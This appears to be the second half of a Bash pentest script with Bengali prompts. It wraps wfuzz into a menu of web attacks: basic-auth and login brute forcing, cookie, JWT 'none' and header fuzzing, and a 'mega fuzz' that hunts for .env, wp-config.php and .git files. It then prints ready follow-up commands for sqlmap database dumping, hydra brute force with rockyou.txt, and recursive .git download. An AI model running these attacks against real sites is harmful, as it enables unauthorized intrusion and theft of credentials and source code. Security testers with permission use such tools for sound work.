            run_wfuzz "Basic Auth Pass Fuzz" "-w '$WORDLIST' --basic '$fixed_user:FUZZ' '$auth_url'"
            ;;
        3)
            get_wordlist "Username wordlist" || return
            local user_wl="$WORDLIST"
            get_wordlist "Password wordlist" || return
            run_wfuzz "Basic Auth Full Fuzz" "-w '$user_wl' -w '$WORDLIST' --basic 'FUZZ:FUZ2Z' '$auth_url'"
            ;;
    esac
}

# ================================================================
# MODE 17 — COOKIE FUZZING
# ================================================================
mode_cookie_fuzz() {
    read -p "$(echo -e ${WHITE}"Cookie name দিন (e.g. session, PHPSESSID): "${NC})" cookie_name
    [ -z "$cookie_name" ] && cookie_name="session"

    get_wordlist "Cookie value wordlist" || return

    HIDE_OPT="--hc 404,403"
    run_wfuzz "Cookie Fuzzing" "-w '$WORDLIST' -b '${cookie_name}=FUZZ' '$TARGET'"
    HIDE_OPT="--hc 404,400,500"
}

# ================================================================
# MODE 18 — JWT FUZZING
# ================================================================
mode_jwt_fuzz() {
    echo ""
    echo -e "${CYAN}JWT Fuzzing — algorithm none attack test:${NC}"
    read -p "$(echo -e ${WHITE}"JWT header (Authorization: Bearer) value দিন: "${NC})" jwt_val
    [ -z "$jwt_val" ] && echo -e "${RED}[!] JWT দাও।${NC}" && return

    local jwt_file="/tmp/wfuzz_jwt_$$.txt"
    cat > "$jwt_file" << 'EOF'
none
None
NONE
HS256
RS256
HS512
EOF

    HEADER_OPT="-H 'Authorization: Bearer FUZZ'"
    HIDE_OPT="--hc 404,401"
    run_wfuzz "JWT Algorithm Fuzz" "-w '$jwt_file' '$TARGET'"
    HIDE_OPT="--hc 404,400,500"
    HEADER_OPT=""
    rm -f "$jwt_file"
}

# ================================================================
# MODE 19 — HTTP HEADER FUZZING
# ================================================================
mode_header_fuzz() {
    echo -e "${CYAN}Header type:${NC}"
    echo -e "  ${GREEN}1)${NC} X-Forwarded-For  ${GREEN}2)${NC} X-Real-IP  ${GREEN}3)${NC} Custom header"
    read -p "$(echo -e ${YELLOW}"[1-3]: "${NC})" hch

    local header_name=""
    case $hch in
        1) header_name="X-Forwarded-For" ;;
        2) header_name="X-Real-IP" ;;
        3) read -p "$(echo -e ${WHITE}"Header name: "${NC})" header_name ;;
    esac

    get_wordlist "Header value wordlist" || return

    HIDE_OPT="--hc 404,403"
    run_wfuzz "Header Fuzzing ($header_name)" "-w '$WORDLIST' -H '${header_name}: FUZZ' '$TARGET'"
    HIDE_OPT="--hc 404,400,500"
}

# ================================================================
# MODE 20 — USER-AGENT FUZZING
# ================================================================
mode_ua_fuzz() {
    local ua_file="/tmp/wfuzz_ua_$$.txt"
    cat > "$ua_file" << 'EOF'
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Googlebot/2.1 (+http://www.google.com/bot.html)
Mozilla/5.0 (compatible; Bingbot/2.0)
curl/7.68.0
python-requests/2.25.1
sqlmap/1.0
nikto/2.1.6
nessus
openvas
masscan
Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)
Mozilla/5.0 (Android 11; Mobile)
EOF

    HIDE_OPT="--hc 404,500"
    run_wfuzz "User-Agent Fuzzing" "-w '$ua_file' -H 'User-Agent: FUZZ' '$TARGET'"
    HIDE_OPT="--hc 404,400,500"
    rm -f "$ua_file"
}

# ================================================================
# MODE 21 — HOST HEADER FUZZING (VHOST)
# ================================================================
mode_vhost_fuzz() {
    get_wordlist "Subdomain/VHost wordlist" || return

    local domain; domain=$(echo "$TARGET" | sed 's|https\?://||' | cut -d'/' -f1)

    HIDE_OPT="--hc 404,400"
    run_wfuzz "VHost Fuzzing" "-w '$WORDLIST' -H 'Host: FUZZ.$domain' '$TARGET'"
    HIDE_OPT="--hc 404,400,500"
}

# ================================================================
# MODE 22 — REFERER FUZZING
# ================================================================
mode_referer_fuzz() {
    get_wordlist "Referer value wordlist" || return

    HIDE_OPT="--hc 404,403"
    run_wfuzz "Referer Fuzzing" "-w '$WORDLIST' -H 'Referer: FUZZ' '$TARGET'"
    HIDE_OPT="--hc 404,400,500"
}

# ================================================================
# MODE 23 — MULTI-PAYLOAD (2 FUZZ)
# ================================================================
mode_multi_payload() {
    echo ""
    echo -e "${CYAN}Multi-payload (FUZZ + FUZ2Z) — দুটো আলাদা position fuzz:${NC}"
    echo -e "${DIM}উদাহরণ: ?user=FUZZ&pass=FUZ2Z${NC}"
    echo ""

    read -p "$(echo -e ${WHITE}"URL (FUZZ + FUZ2Z সহ): "${NC})" multi_url
    [ -z "$multi_url" ] && multi_url="${TARGET}?user=FUZZ&pass=FUZ2Z"

    get_wordlist "Wordlist 1 (FUZZ)" || return
    local wl1="$WORDLIST"
    get_wordlist "Wordlist 2 (FUZ2Z)" || return
    local wl2="$WORDLIST"

    run_wfuzz "Multi-Payload Fuzz" "-w '$wl1' -w '$wl2' '$multi_url'"
}

# ================================================================
# MODE 24 — FILTER BY SIZE
# ================================================================
mode_filter_size() {
    get_wordlist || return

    read -p "$(echo -e ${WHITE}"Hide response size (bytes, e.g. 1234): "${NC})" hide_size
    read -p "$(echo -e ${WHITE}"Show only size (Enter=skip): "${NC})" show_size

    local size_filter=""
    [ -n "$hide_size" ] && size_filter="--hs '$hide_size'"
    [ -n "$show_size" ] && size_filter="--ss '$show_size'"

    local url="$TARGET"
    [[ "$url" != *"FUZZ"* ]] && url="${url}/FUZZ"

    HIDE_OPT="--hc 404"
    run_wfuzz "Size Filter Fuzz" "-w '$WORDLIST' $size_filter '$url'"
    HIDE_OPT="--hc 404,400,500"
}

# ================================================================
# MODE 25 — FILTER BY WORDS/LINES
# ================================================================
mode_filter_words() {
    get_wordlist || return

    read -p "$(echo -e ${WHITE}"Hide word count (e.g. 10): "${NC})" hide_words
    read -p "$(echo -e ${WHITE}"Hide line count (e.g. 5): "${NC})" hide_lines

    local filter=""
    [ -n "$hide_words" ] && filter="$filter --hw $hide_words"
    [ -n "$hide_lines" ] && filter="$filter --hl $hide_lines"

    local url="$TARGET"
    [[ "$url" != *"FUZZ"* ]] && url="${url}/FUZZ"

    HIDE_OPT="--hc 404"
    run_wfuzz "Word/Line Filter Fuzz" "-w '$WORDLIST' $filter '$url'"
    HIDE_OPT="--hc 404,400,500"
}

# ================================================================
# MODE 26 — PROXY SCAN
# ================================================================
mode_proxy_scan() {
    read -p "$(echo -e ${WHITE}"Proxy (e.g. http://127.0.0.1:8080): "${NC})" proxy
    [ -z "$proxy" ] && proxy="http://127.0.0.1:8080"
    PROXY_OPT="-p $proxy"

    get_wordlist || return
    local url="$TARGET"
    [[ "$url" != *"FUZZ"* ]] && url="${url}/FUZZ"

    run_wfuzz "Proxy Scan" "-w '$WORDLIST' '$url'"
    PROXY_OPT=""
}

# ================================================================
# MODE 27 — RATE-LIMITED SCAN
# ================================================================
mode_rate_limited() {
    get_wordlist || return

    read -p "$(echo -e ${WHITE}"Delay between requests (seconds, e.g. 0.5): "${NC})" delay
    [ -z "$delay" ] && delay="0.5"
    DELAY_OPT="-s $delay"
    THREADS_OPT="-t 1"

    local url="$TARGET"
    [[ "$url" != *"FUZZ"* ]] && url="${url}/FUZZ"

    run_wfuzz "Rate-Limited Scan" "-w '$WORDLIST' '$url'"
    DELAY_OPT=""
    THREADS_OPT="-t 20"
}

# ================================================================
# MODE 28 — SMART WEB FUZZ
# ================================================================
mode_smart_fuzz() {
    get_wordlist "Main wordlist" || return
    local main_wl="$WORDLIST"

    echo ""
    echo -e "${CYAN}${BOLD}Smart Web Fuzz — ৩ ধাপে:${NC}"
    echo -e "  ${WHITE}1: Directory fuzz  2: Parameter fuzz  3: Extension fuzz${NC}"
    echo ""
    read -p "$(echo -e ${YELLOW}"[?] শুরু করবেন? (y/n): "${NC})" go
    [[ ! "$go" =~ ^[Yy]$ ]] && return

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local safe; safe=$(echo "$TARGET" | sed 's|https\?://||' | sed 's/[^a-zA-Z0-9._-]/_/g' | head -c 50)
    OUTPUT_FILE="$RESULTS_DIR/smart_fuzz_${safe}_${ts}.txt"
    SCAN_LABEL="Smart Web Fuzz"

    echo -e "${CYAN}━━━ Phase 1: Directory Fuzzing ━━━${NC}"
    wfuzz $THREADS_OPT $HIDE_OPT $COOKIE_OPT -w "$main_wl" \
        "${TARGET}/FUZZ" 2>&1 | tee -a "$OUTPUT_FILE"

    echo -e "${CYAN}━━━ Phase 2: GET Parameter Fuzzing ━━━${NC}"
    local param_wl="/tmp/wfuzz_smart_param_$$.txt"
    cat > "$param_wl" << 'EOF'
id,page,file,path,url,search,q,query,user,admin,debug,test,key,token,action,type,lang
EOF
    tr ',' '\n' < "$param_wl" > "${param_wl}.clean"
    mv "${param_wl}.clean" "$param_wl"
    wfuzz $THREADS_OPT --hc 404 $COOKIE_OPT -w "$param_wl" \
        "${TARGET}?FUZZ=1" 2>&1 | tee -a "$OUTPUT_FILE"

    echo -e "${CYAN}━━━ Phase 3: PHP/Backup Extension ━━━${NC}"
    local ext_wl="/tmp/wfuzz_smart_ext_$$.txt"
    printf "php\nbak\nold\nenv\nsql\nconf\ntxt\nxml\njson\n" > "$ext_wl"
    wfuzz $THREADS_OPT $HIDE_OPT $COOKIE_OPT -w "$main_wl" -w "$ext_wl" \
        "${TARGET}/FUZZ.FUZ2Z" 2>&1 | tee -a "$OUTPUT_FILE"

    rm -f "$param_wl" "$ext_wl"

    echo ""
    echo -e "${GREEN}${BOLD}[✓] Smart Web Fuzz সম্পন্ন!${NC}"
    bangla_analysis "$OUTPUT_FILE"
    suggest_next_tool "$OUTPUT_FILE"
    save_results "$OUTPUT_FILE"
}

# ================================================================
# MODE 29 — ALL IN ONE MEGA FUZZ
# ================================================================
mode_allinone() {
    get_wordlist "Main wordlist" || return
    local main_wl="$WORDLIST"

    echo ""
    echo -e "${RED}${BOLD}[!] All-in-One Mega Fuzz — সব mode একসাথে।${NC}"
    echo -e "${YELLOW}[!] এটি অনেক সময় নিতে পারে।${NC}"
    read -p "$(echo -e ${YELLOW}"[?] শুরু করবেন? (y/n): "${NC})" go
    [[ ! "$go" =~ ^[Yy]$ ]] && return

    local ts; ts=$(date +"%Y%m%d_%H%M%S")
    local safe; safe=$(echo "$TARGET" | sed 's|https\?://||' | sed 's/[^a-zA-Z0-9._-]/_/g' | head -c 50)
    OUTPUT_FILE="$RESULTS_DIR/mega_fuzz_${safe}_${ts}.txt"
    SCAN_LABEL="All-in-One Mega Fuzz"

    {
        echo "================================================================"
        echo "  Wfuzz ALL-IN-ONE MEGA FUZZ — SAIMUM"
        echo "  Target: $TARGET"
        echo "  Date: $(date)"
        echo "================================================================"
    } > "$OUTPUT_FILE"

    # Phase 1: Directories
    echo -e "${CYAN}━━━ Phase 1: Directory Fuzz ━━━${NC}"
    wfuzz $THREADS_OPT --hc 404,400 -w "$main_wl" "${TARGET}/FUZZ" 2>&1 | tee -a "$OUTPUT_FILE"

    # Phase 2: Extensions
    echo -e "${CYAN}━━━ Phase 2: File Extensions ━━━${NC}"
    local ext_wl="/tmp/wfuzz_mega_ext_$$.txt"
    printf "php\nphp5\nbak\nold\nenv\nsql\nconf\ntxt\nxml\njson\nzip\n" > "$ext_wl"
    wfuzz $THREADS_OPT --hc 404,400 -w "$main_wl" -w "$ext_wl" \
        "${TARGET}/FUZZ.FUZ2Z" 2>&1 | tee -a "$OUTPUT_FILE"

    # Phase 3: GET params
    echo -e "${CYAN}━━━ Phase 3: GET Parameters ━━━${NC}"
    local param_wl="/tmp/wfuzz_mega_param_$$.txt"
    printf "id\npage\nfile\npath\nuser\nadmin\ndebug\nkey\ntoken\naction\n" > "$param_wl"
    wfuzz $THREADS_OPT --hc 404 -w "$param_wl" "${TARGET}?FUZZ=1" 2>&1 | tee -a "$OUTPUT_FILE"

    # Phase 4: Backup files
    echo -e "${CYAN}━━━ Phase 4: Backup Files ━━━${NC}"
    local bak_wl="/tmp/wfuzz_mega_bak_$$.txt"
    printf "config\nbackup\ndatabase\n.env\nweb.config\nwp-config.php\n.htaccess\n.git/HEAD\n" > "$bak_wl"
    wfuzz $THREADS_OPT --hc 404,400 -w "$bak_wl" "${TARGET}/FUZZ" 2>&1 | tee -a "$OUTPUT_FILE"

    # Phase 5: VHost
    echo -e "${CYAN}━━━ Phase 5: VHost Discovery ━━━${NC}"
    local domain; domain=$(echo "$TARGET" | sed 's|https\?://||' | cut -d'/' -f1)
    local vhost_wl="/tmp/wfuzz_mega_vhost_$$.txt"
    printf "www\napi\ndev\nstaging\ntest\nmail\nftp\nadmin\nportal\nvpn\n" > "$vhost_wl"
    wfuzz $THREADS_OPT --hc 404,400 -w "$vhost_wl" \
        -H "Host: FUZZ.$domain" "$TARGET" 2>&1 | tee -a "$OUTPUT_FILE"

    rm -f "$ext_wl" "$param_wl" "$bak_wl" "$vhost_wl"

    echo ""
    echo -e "${GREEN}${BOLD}[✓] All-in-One Mega Fuzz সম্পন্ন!${NC}"
    bangla_analysis "$OUTPUT_FILE"
    suggest_next_tool "$OUTPUT_FILE"
    save_results "$OUTPUT_FILE"
}

# ================================================================
# BANGLA ANALYSIS
# ================================================================
bangla_analysis() {
    local outfile=$1

    echo ""
    echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}${BOLD}║             বাংলায় স্ক্যান রিপোর্ট বিশ্লেষণ                      ║${NC}"
    echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    [ ! -f "$outfile" ] || [ ! -s "$outfile" ] && \
        echo -e "  ${YELLOW}[!] কোনো result পাওয়া যায়নি।${NC}" && echo "" && return

    # Count results
    local ok200; ok200=$(grep -c "200" "$outfile" 2>/dev/null || echo 0)
    local redir;  redir=$(grep -cE " 30[0-9] " "$outfile" 2>/dev/null || echo 0)
    local auth403; auth403=$(grep -c " 403 " "$outfile" 2>/dev/null || echo 0)
    local total; total=$((ok200 + redir + auth403))

    echo -e "  ${CYAN}${BOLD}━━━ Findings Statistics ━━━${NC}"
    echo -e "  ${WHITE}মোট Found    : ${GREEN}$total${NC}"
    echo -e "  ${GREEN}   200 OK    : $ok200${NC}"
    echo -e "  ${YELLOW}   Redirects : $redir${NC}"
    echo -e "  ${CYAN}   Forbidden : $auth403${NC}"
    echo ""

    local critical=0 high=0 medium=0

    # Git/env/config exposed
    if grep -qiE "\.git|\.env|config\.php|wp-config|backup|\.sql" "$outfile" 2>/dev/null; then
        critical=$((critical+1))
        echo -e "  ${RED}${BOLD}🚨 Sensitive File/Directory Found!${NC}"
        grep -iE "\.git|\.env|config\.php|backup|\.sql" "$outfile" | grep " 200 " | head -5 | \
            while IFS= read -r l; do echo -e "  ${RED}▸ $l${NC}"; done
        echo -e "     ${WHITE}→ Source code বা credentials exposed হতে পারে।${NC}"
        echo -e "     ${RED}→ ঝুঁকি: CRITICAL${NC}"; echo ""
    fi

    # Admin/login found
    if grep -qiE "/admin|/login|/dashboard|/panel|phpmyadmin" "$outfile" 2>/dev/null; then
        high=$((high+1))
        echo -e "  ${YELLOW}${BOLD}⚠ Admin/Login Panel Found!${NC}"
        grep -iE "/admin|/login|/dashboard|phpmyadmin" "$outfile" | grep -E " 200 | 302 " | head -5 | \
            while IFS= read -r l; do echo -e "  ${YELLOW}▸ $l${NC}"; done
        echo -e "     ${WHITE}→ Brute force বা default credential test করুন।${NC}"
        echo -e "     ${YELLOW}→ ঝুঁকি: HIGH${NC}"; echo ""
    fi

    # API endpoints
    if grep -qiE "/api/|graphql|swagger" "$outfile" 2>/dev/null; then
        high=$((high+1))
        echo -e "  ${YELLOW}${BOLD}⚡ API Endpoints Found!${NC}"
        grep -iE "/api/|graphql|swagger" "$outfile" | grep " 200 " | head -5 | \
            while IFS= read -r l; do echo -e "  ${YELLOW}▸ $l${NC}"; done
        echo -e "     ${YELLOW}→ ঝুঁকি: HIGH${NC}"; echo ""
    fi

    # Injection possible (error responses with payloads)
    if grep -qiE "500|error|exception|SQL|syntax" "$outfile" 2>/dev/null; then
        high=$((high+1))
        echo -e "  ${RED}${BOLD}💉 Potential Injection Response!${NC}"
        echo -e "     ${WHITE}→ Server error response পাওয়া গেছে — injection সম্ভব।${NC}"
        echo -e "     ${RED}→ ঝুঁকি: HIGH${NC}"; echo ""
    fi

    # Upload directory
    if grep -qiE "/upload|/uploads|/files|/media" "$outfile" 2>/dev/null; then
        medium=$((medium+1))
        echo -e "  ${CYAN}${BOLD}📁 Upload Directory Found!${NC}"
        echo -e "     ${WHITE}→ File upload vulnerability test করুন।${NC}"
        echo -e "     ${CYAN}→ ঝুঁকি: MEDIUM${NC}"; echo ""
    fi

    # Risk summary
    echo -e "  ${CYAN}${BOLD}━━━ সামগ্রিক ঝুঁকি মূল্যায়ন ━━━${NC}"
    echo -e "  ${RED}   Critical : $critical টি${NC}"
    echo -e "  ${YELLOW}   High     : $high টি${NC}"
    echo -e "  ${CYAN}   Medium   : $medium টি${NC}"
    echo -e "  ${WHITE}   Total    : $total found${NC}"
    echo ""

    if   [ "$critical" -gt 0 ]; then
        echo -e "  ${RED}${BOLD}  সার্বিক ঝুঁকি : ██████████ CRITICAL — এখনই পদক্ষেপ নিন!${NC}"
    elif [ "$high" -gt 0 ]; then
        echo -e "  ${YELLOW}${BOLD}  সার্বিক ঝুঁকি : ███████░░░ HIGH — দ্রুত fix করুন।${NC}"
    elif [ "$medium" -gt 0 ]; then
        echo -e "  ${CYAN}  সার্বিক ঝুঁকি : █████░░░░░ MEDIUM — মনোযোগ দিন।${NC}"
    elif [ "$total" -gt 0 ]; then
        echo -e "  ${GREEN}  সার্বিক ঝুঁকি : ███░░░░░░░ LOW — manually review করুন।${NC}"
    else
        echo -e "  ${GREEN}  সার্বিক ঝুঁকি : ██░░░░░░░░ INFO — কোনো interesting result নেই।${NC}"
    fi
    echo ""
}

# ================================================================
# NEXT TOOL SUGGESTION
# ================================================================
suggest_next_tool() {
    local outfile=$1

    echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║             পরবর্তী Tool এর সাজেশন                                 ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    local domain; domain=$(echo "$TARGET" | sed 's|https\?://||' | cut -d'/' -f1)

    if grep -qiE "\.git|\.env|config|backup" "$outfile" 2>/dev/null; then
        echo -e "  ${RED}${BOLD}📥 wget / curl${NC} — Sensitive File Download"
        echo -e "     ${CYAN}কমান্ড: wget -r http://$domain/.git/${NC}"; echo ""
    fi

    if grep -qiE "/api|graphql|swagger|\.php" "$outfile" 2>/dev/null; then
        echo -e "  ${GREEN}${BOLD}💉 SQLmap${NC} — SQL Injection Test"
        echo -e "     ${CYAN}কমান্ড: sqlmap -u '$TARGET?id=1' --dbs --batch${NC}"; echo ""
        echo -e "  ${MAGENTA}${BOLD}🔍 Nuclei${NC} — Vulnerability Scan"
        echo -e "     ${CYAN}কমান্ড: nuclei -u http://$domain -t . -severity medium,high,critical${NC}"; echo ""
    fi

    if grep -qiE "/admin|/login" "$outfile" 2>/dev/null; then
        echo -e "  ${YELLOW}${BOLD}🔑 Hydra${NC} — Login Brute Force"
        echo -e "     ${CYAN}কমান্ড: hydra -L users.txt -P rockyou.txt $domain http-post-form '/login:u=^USER^&p=^PASS^:F=wrong'${NC}"; echo ""
    fi

    echo -e "  ${WHITE}${BOLD}🌐 Nikto${NC} — Full Web Scan"
    echo -e "     ${CYAN}কমান্ড: nikto -h http://$domain${NC}"; echo ""

    echo -e "  ${GREEN}${BOLD}🔍 Gobuster${NC} — Alternative Directory Fuzzer"
    echo -e "     ${CYAN}কমান্ড: gobuster dir -u http://$domain -w ${DEFAULT_WORDLIST:-wordlist.txt}${NC}"; echo ""

    echo -e "  ${MAGENTA}${BOLD}⚡ FFUF${NC} — Fast Web Fuzzer"
    echo -e "     ${CYAN}কমান্ড: ffuf -u http://$domain/FUZZ -w ${DEFAULT_WORDLIST:-wordlist.txt}${NC}"; echo ""
}

# ================================================================
# SAVE RESULTS
# ================================================================
save_results() {
    local file=$1
    echo ""
    echo -e "${GREEN}[✓] Results saved → $file${NC}"
    echo "$(date) | ${SCAN_LABEL:-scan} | $TARGET | $file" >> "$HISTORY_FILE"
    echo ""
}

# ================================================================
# MAIN
# ================================================================
main() {
    show_banner
    check_deps

    while true; do
        get_target
        get_extra_options
        pre_scan_recon "$TARGET"
        show_menu

        read -p "$(echo -e ${YELLOW}"[?] Scan option [0-29]: "${NC})" choice

        [[ "$choice" == "0" ]] && {
            echo -e "${GREEN}${BOLD} Goodbye! Stay legal & ethical! 🛡️${NC}"
            exit 0
        }

        case $choice in
            1)  mode_dir_fuzz ;;
            2)  mode_ext_fuzz ;;
            3)  mode_recursive_fuzz ;;
            4)  mode_backup_fuzz ;;
            5)  mode_get_param_fuzz ;;
            6)  mode_post_param_fuzz ;;
            7)  mode_value_fuzz ;;
            8)  mode_hidden_param ;;
            9)  mode_sqli_fuzz ;;
            10) mode_xss_fuzz ;;
            11) mode_traversal_fuzz ;;
            12) mode_cmdi_fuzz ;;
            13) mode_ssti_fuzz ;;
            14) mode_lfi_fuzz ;;
            15) mode_login_brute ;;
            16) mode_basic_auth ;;
            17) mode_cookie_fuzz ;;
            18) mode_jwt_fuzz ;;
            19) mode_header_fuzz ;;
            20) mode_ua_fuzz ;;
            21) mode_vhost_fuzz ;;
            22) mode_referer_fuzz ;;
            23) mode_multi_payload ;;
            24) mode_filter_size ;;
            25) mode_filter_words ;;
            26) mode_proxy_scan ;;
            27) mode_rate_limited ;;
            28) mode_smart_fuzz ;;
            29) mode_allinone ;;
            *)  echo -e "${RED}[!] ভুল অপশন।${NC}" ;;
        esac

        echo ""
        read -p "$(echo -e ${YELLOW}"[?] আরেকটি scan করবেন? (y/n): "${NC})" again
        [[ ! "$again" =~ ^[Yy]$ ]] && {
            echo -e "${GREEN}${BOLD} Goodbye! Stay legal & ethical! 🛡️${NC}"
            exit 0
        }
        unset TARGET
        show_banner
    done
}

main
